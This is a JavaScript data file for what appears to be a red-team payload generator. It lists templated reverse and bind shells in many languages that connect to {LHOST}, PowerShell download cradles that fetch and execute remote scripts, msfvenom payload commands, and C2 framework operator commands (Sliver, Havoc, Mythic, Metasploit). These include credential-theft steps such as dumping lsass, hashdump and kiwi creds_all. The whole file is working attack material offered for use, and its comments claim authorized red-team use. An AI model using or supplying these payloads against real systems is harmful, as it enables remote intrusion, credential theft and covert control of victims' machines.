// APT115 CODEX ARCANUM — Reverse Shell & C2 payload data
// Plantillas con {LHOST} {LPORT} {RHOST} {DOMAIN} — se sustituyen con sub()
// usando la barra de variables global. Sólo datos, sin lógica.
//
// Las secciones de C2 (Sliver/Havoc/Mythic/Metasploit) son referencia de
// operador para red team AUTORIZADO: comandos que corrés en TU infraestructura.

window.RevshellData = {
  categories: [

    { id: 'reverse', label: 'Reverse Shell', enc: true, groups: [
      { name: 'Unix / Linux', items: [
        ['Bash -i', 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'],
        ['Bash 196 (fd)', '0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT};sh <&196 >&196 2>&196'],
        ['Bash read-line', 'exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done'],
        ['sh -i', 'sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'],
        ['nc -e', 'nc -e /bin/sh {LHOST} {LPORT}'],
        ['nc mkfifo', 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f'],
        ['ncat', 'ncat {LHOST} {LPORT} -e /bin/bash'],
        ['ncat ssl', 'ncat --ssl {LHOST} {LPORT} -e /bin/bash'],
        ['socat', 'socat TCP:{LHOST}:{LPORT} EXEC:\'/bin/sh\',pty,stderr,setsid,sigint,sane'],
        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
        ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/sh 1>$TF'],
      ]},
      { name: 'Lenguajes', items: [
        ['Python3', 'python3 -c \'import socket,subprocess,os,pty;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\''],
        ['Python3 (corto)', 'export RHOST="{LHOST}";export RPORT={LPORT};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''],
        ['PHP', 'php -r \'$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");\''],
        ['Perl', 'perl -e \'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''],
        ['Ruby', 'ruby -rsocket -e\'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''],
        ['Golang', 'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go'],
        ['Node.js', 'node -e \'var c=require("child_process").spawn("/bin/sh");var s=require("net").connect({LPORT},"{LHOST}",function(){s.pipe(c.stdin);c.stdout.pipe(s);c.stderr.pipe(s);})\''],
        ['Lua', 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{LHOST}\',{LPORT});os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"'],
        ['OpenSSL', '# Listener: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes; openssl s_server -quiet -key key.pem -cert cert.pem -port {LPORT}\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s'],
      ]},
      { name: 'Windows / PowerShell', items: [
        ['PowerShell TCP', 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'],
        ['PowerShell (download cradle)', 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}/shell.ps1\')"'],
        ['conpty (better TTY)', '# Invoke-ConPtyShell — full interactive\nIEX(IWR http://{LHOST}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {LHOST} {LPORT}'],
        ['cmd nc.exe', 'nc.exe {LHOST} {LPORT} -e cmd.exe'],
        ['Powercat', 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{LHOST}/powercat.ps1\');powercat -c {LHOST} -p {LPORT} -e cmd"'],
      ]},
    ]},

    { id: 'bind', label: 'Bind Shell', enc: true, groups: [
      { name: 'Bind (víctima escucha en {RPORT})', items: [
        ['nc -e', 'nc -lvnp {RPORT} -e /bin/bash'],
        ['nc mkfifo', 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp {RPORT} >/tmp/f'],
        ['ncat', 'ncat -lvnp {RPORT} -e /bin/bash'],
        ['socat', 'socat TCP-LISTEN:{RPORT},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'],
        ['Python3', 'python3 -c \'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{RPORT}));s.listen(1);(c,a)=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\''],
        ['PowerShell', 'powershell -nop -c "$l=New-Object System.Net.Sockets.TcpListener(\'0.0.0.0\',{RPORT});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS>\';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"'],
        ['Connect to bind', '# Desde tu atacante:\nnc {RHOST} {RPORT}'],
      ]},
    ]},

    { id: 'listener', label: 'Listener', groups: [
      { name: 'En tu máquina (escuchá en {LPORT})', items: [
        ['nc', 'nc -lvnp {LPORT}'],
        ['rlwrap nc (historial/flechas)', 'rlwrap -cAr nc -lvnp {LPORT}'],
        ['ncat ssl', 'ncat --ssl -lvnp {LPORT}'],
        ['pwncat-cs', 'pwncat-cs -lp {LPORT}'],
        ['socat (full TTY)', 'socat -d -d TCP-LISTEN:{LPORT},reuseaddr,fork FILE:`tty`,raw,echo=0'],
        ['Metasploit multi/handler', 'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run"'],
      ]},
    ]},

    { id: 'tty', label: 'TTY Upgrade', groups: [
      { name: 'Estabilizar la shell (Linux)', items: [
        ['Python PTY', 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\n# o: python -c ... / script -qc /bin/bash /dev/null'],
        ['Pasos completos (recomendado)', '# 1) en la víctima:\npython3 -c \'import pty;pty.spawn("/bin/bash")\'\n# 2) Ctrl+Z (background)\n# 3) en tu host:\nstty raw -echo; fg\n# 4) (Enter) en la víctima:\nexport TERM=xterm; stty rows 38 columns 116'],
        ['script', 'script -qc /bin/bash /dev/null'],
        ['stty size (ajustar)', '# en tu host: stty -a  (mirá rows/columns)\nstty rows 38 columns 116'],
      ]},
    ]},

    { id: 'msfvenom', label: 'MSFVenom', enc: false, groups: [
      { name: 'Payloads (reverse a {LHOST}:{LPORT})', items: [
        ['Windows exe (x64 meterpreter)', 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe'],
        ['Windows exe (staged shell)', 'msfvenom -p windows/x64/shell/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe'],
        ['Windows DLL', 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f dll -o shell.dll'],
        ['Windows shellcode (C)', 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f c -e x64/xor_dynamic'],
        ['Linux ELF', 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf'],
        ['PHP', 'msfvenom -p php/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php'],
        ['ASPX', 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx'],
        ['WAR (Java/Tomcat)', 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war'],
        ['Python', 'msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.py'],
        ['Apple macOS (x64)', 'msfvenom -p osx/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o shell.macho'],
      ]},
    ]},

    { id: 'c2', label: 'C2 Frameworks', note: 'Referencia de operador para red team autorizado — comandos en TU infraestructura.', groups: [
      { name: 'Sliver (BishopFox)', items: [
        ['Instalar + server', 'curl https://sliver.sh/install | sudo bash\n# luego el cliente:\nsliver'],
        ['Implant mTLS (exe)', 'generate --mtls {LHOST}:{LPORT} --os windows --arch amd64 --format exe --save /tmp/'],
        ['Beacon mTLS (jitter)', 'generate beacon --mtls {LHOST}:{LPORT} --seconds 60 --jitter 30 --os windows --save /tmp/'],
        ['Implant HTTP(S)', 'generate --http {LHOST}:{LPORT} --os windows --format exe --save /tmp/'],
        ['Implant DNS', 'generate --dns {DOMAIN} --os windows --save /tmp/'],
        ['Listeners', 'mtls --lport {LPORT}\nhttps --lport {LPORT}\ndns --domains {DOMAIN}'],
        ['Sessions / beacons', 'sessions\nbeacons\nuse <id>'],
        ['Stager (staged)', 'profiles new --mtls {LHOST}:{LPORT} --format shellcode win-x64\ngenerate stager --lhost {LHOST} --lport {LPORT} --protocol tcp --format raw'],
        ['Post-ex comunes', 'whoami | getsystem | execute-assembly /tmp/Rubeus.exe | psexec | portfwd add -b 127.0.0.1:3389 | socks5 start | screenshot | procdump -n lsass.exe'],
      ]},
      { name: 'Havoc (C5pider)', items: [
        ['Build + teamserver', '# en el repo de Havoc:\nmake ts-build && make client-build\n./havoc server --profile ./profiles/havoc.yaotl -v'],
        ['Cliente', './havoc client   # conectar a {LHOST}, login del perfil'],
        ['Listener + Demon', '# GUI: View > Listeners > Add (HTTP/HTTPS, Host {LHOST}, Port {LPORT})\n# Attack > Payload > Demon (Windows exe/dll/shellcode) → genera el implant'],
        ['Comandos Demon', 'shell whoami | powershell <cmd> | dotnet inline-execute /tmp/asm.exe | proc list | inject <pid> | dll-spawn | token steal <pid> | socks add {LPORT} | screenshot'],
      ]},
      { name: 'Mythic (its-a-feature)', items: [
        ['Instalar + start', 'git clone https://github.com/its-a-feature/Mythic && cd Mythic\nsudo make\nsudo ./mythic-cli start\n# UI: https://{LHOST}:7443  (creds en .env)'],
        ['Instalar agente (Apollo)', 'sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo'],
        ['Instalar C2 profile (http)', 'sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http'],
        ['Operación', '# En la UI: crear Payload (agente + C2 profile, callback {LHOST}:{LPORT}),\n# generar, ejecutar en el target, tasking desde la UI o mythic-cli'],
      ]},
      { name: 'Metasploit', items: [
        ['Handler', 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; exploit -j"'],
        ['Meterpreter post-ex', 'getuid | sysinfo | getsystem | hashdump | load kiwi | creds_all | migrate -N explorer.exe | portfwd add -l {LPORT} -p 3389 -r {RHOST} | run autoroute -s 10.10.10.0/24'],
        ['Pivoting (socks)', 'use auxiliary/server/socks_proxy; set SRVPORT 1080; run -j\n# luego proxychains <herramienta>'],
      ]},
    ]},

  ]
};
